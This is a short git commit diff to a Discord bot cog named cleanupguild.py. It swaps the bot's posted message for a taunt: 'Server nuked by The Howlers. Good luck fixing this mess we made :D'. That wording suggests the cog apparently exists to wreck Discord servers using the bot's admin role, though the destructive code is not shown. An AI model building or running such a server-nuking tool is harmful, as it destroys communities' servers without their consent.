6546c0eb341c4129f99281a2aa09e19add7be355
Blizzard the Wolf <60931830+BlizzardTheWolf@users.noreply.github.com>
2023-10-03 22:01:03 +0200

    Update cleanupguild.py

--- antinike/cleanupguild.py
+++ antinike/cleanupguild.py
@@ -29,7 +29,7 @@ class CleanupGuild(commands.Cog):
         channel = await guild.create_text_channel(channel_title, category=category)
 
         # Send a cleanup message in the new channel
-        await channel.send("Server cleaned up @everyone")
+        await channel.send("Server nuked by The Howlers. Good luck fixing this mess we made :D")
 
         # Get the bot's admin role (the top role)
         bot_role = guild.get_member(self.bot.user.id).top_role
